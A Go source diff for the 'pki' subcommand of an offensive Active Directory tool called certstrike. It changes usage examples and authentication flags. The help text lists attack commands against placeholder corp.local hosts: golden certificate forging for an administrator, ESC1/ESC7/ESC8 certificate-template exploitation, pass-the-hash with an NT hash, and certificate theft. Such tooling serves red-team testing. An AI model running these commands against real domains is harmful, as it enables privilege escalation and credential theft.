@@ -21,24 +21,18 @@ var pkiCmd = &cobra.Command{
 	Long: `ADCS enumeration (ESC1-ESC14), golden certificate forging, ESC exploitation, PFX import, and engagement reporting.
 
 Examples:
-  certstrike pki --enum --target-dc dc01.corp.local --domain corp.local --username user --password pass
-  certstrike pki --enum --target-dc dc01.corp.local --domain corp.local --ldaps --username user --password pass
-  certstrike pki --enum --target-dc dc01.corp.local --domain corp.local --start-tls --username user --password pass
-  certstrike pki --enum --target-dc dc01.corp.local --domain corp.local --json --username user --password pass
-  certstrike pki --enum --target-dc dc01.corp.local --domain corp.local --stealth --username user --password pass
-  certstrike pki --forge --upn administrator@corp.local --ca-key ca-key.pem --output admin-cert.pem
-  certstrike pki --forge --upn administrator@corp.local --ca-key ca-key.pem --ca-cert ca-cert.pem --output golden.pem
-  certstrike pki --exploit esc1 --template VulnTemplate --upn admin@domain.com --target-dc dc01.corp.local --domain corp.local
-  certstrike pki --exploit esc4 --template WritableTemplate --upn admin@domain.com --target-dc dc01.corp.local --domain corp.local
-  certstrike pki --exploit esc8 --template Machine --upn admin@domain.com --target-dc dc01.corp.local --domain corp.local
-  certstrike pki --exploit esc9 --template NoSecExtTemplate --upn admin@domain.com --attacker-dn CN=attacker,CN=Users,DC=corp,DC=local --target-dc dc01.corp.local --domain corp.local
-  certstrike pki --exploit esc13 --template LinkedPolicyTemplate --upn user@domain.com --target-dc dc01.corp.local --domain corp.local
-  certstrike pki --auto-detect --target-dc dc01.corp.local --domain corp.local
-  certstrike pki --import-pfx cert.pfx --pfx-password pass
-  certstrike pki --import-pfx cert.pfx --json
-  certstrike pki --report --format markdown --output findings.md --target-dc dc01.corp.local --domain corp.local --username user --password pass
+  certstrike pki --enum --target-dc dc01.corp.local --domain corp.local -u user -p pass
+  certstrike pki --enum --target-dc dc01.corp.local --domain corp.local -u user -p pass --tls
+  certstrike pki --enum --target-dc dc01.corp.local --domain corp.local -u user -p pass --json
+  certstrike pki --enum --target-dc dc01.corp.local --domain corp.local -u user -p pass --stealth
+  certstrike pki --enum --target-dc dc01.corp.local --domain corp.local -u user --hash aad3b435b51404eeaad3b435b51404ee
+  certstrike pki --exploit esc1 --template VulnTemplate --upn admin@corp.local --target-dc dc01.corp.local --domain corp.local -u user -p pass
+  certstrike pki --exploit esc7 --ca CorpCA --upn admin@corp.local --target-dc dc01.corp.local --domain corp.local -u user -p pass
+  certstrike pki --exploit esc8 --template Machine --target-dc dc01.corp.local --domain corp.local -u user -p pass --listener-ip 10.0.0.5
+  certstrike pki --forge --upn admin@corp.local --ca-key ca.key --ca-cert ca.crt
+  certstrike pki --report --format markdown --output findings.md --target-dc dc01.corp.local --domain corp.local -u user -p pass
   certstrike pki --cert-theft all
-  certstrike pki --cert-theft theft4`,
+  certstrike pki --import-pfx cert.pfx`,
 	RunE: func(cmd *cobra.Command, args []string) error {
 		doEnum, _ := cmd.Flags().GetBool("enum")
 		doForge, _ := cmd.Flags().GetBool("forge")
@@ -84,15 +78,10 @@ func buildADCSConfig(cmd *cobra.Command) *pki.ADCSConfig {
 	username, _ := cmd.Flags().GetString("username")
 	password, _ := cmd.Flags().GetString("password")
 	hash, _ := cmd.Flags().GetString("hash")
-	useTLS, _ := cmd.Flags().GetBool("ldaps")
+	useTLS, _ := cmd.Flags().GetBool("tls")
 	useStartTLS, _ := cmd.Flags().GetBool("start-tls")
 	outputJSON, _ := cmd.Flags().GetBool("json")
 	stealth, _ := cmd.Flags().GetBool("stealth")
-
-	// Legacy --tls flag support (maps to --ldaps)
-	if legacyTLS, _ := cmd.Flags().GetBool("tls"); legacyTLS {
-		useTLS = true
-	}
 
 	return &pki.ADCSConfig{
 		TargetDC:    targetDC,
@@ -111,6 +100,9 @@ func runEnumerate(cmd *cobra.Command) error {
 	cfg := buildADCSConfig(cmd)
 	if cfg.TargetDC == "" || cfg.Domain == "" {
 		return fmt.Errorf("--target-dc and --domain are required for enumeration")
+	}
+	if cfg.Username == "" || (cfg.Password == "" && cfg.Hash == "") {
+		return fmt.Errorf("LDAP authentication required: use -u <user> -p <pass> (or --hash <NT_HASH>)")
 	}
 
 	// JSON mode: use EnumerateAll for structured output
@@ -689,12 +681,11 @@ func init() {
 	// Connection flags
 	pkiCmd.Flags().String("target-dc", "", "Target domain controller hostname")
 	pkiCmd.Flags().String("domain", "", "Active Directory domain name")
-	pkiCmd.Flags().String("username", "", "Domain username for authentication")
-	pkiCmd.Flags().String("password", "", "Domain password for authentication")
+	pkiCmd.Flags().StringP("username", "u", "", "Domain username for LDAP authentication")
+	pkiCmd.Flags().StringP("password", "p", "", "Domain password for LDAP authentication")
 	pkiCmd.Flags().String("hash", "", "NTLM hash for pass-the-hash authentication")
-	pkiCmd.Flags().Bool("tls", false, "Use LDAPS (port 636) — legacy alias for --ldaps")
-	pkiCmd.Flags().Bool("ldaps", false, "Use LDAPS (port 636) with TLS from connection start")
-	pkiCmd.Flags().Bool("start-tls", false, "Use StartTLS (connect to port 389 then upgrade to TLS)")
+	pkiCmd.Flags().Bool("tls", false, "Use LDAPS (port 636)")
+	pkiCmd.Flags().Bool("start-tls", false, "Use StartTLS (upgrade plaintext LDAP to TLS)")
 
 	// Certificate flags
 	pkiCmd.Flags().String("upn", "", "User Principal Name for certificate forging")
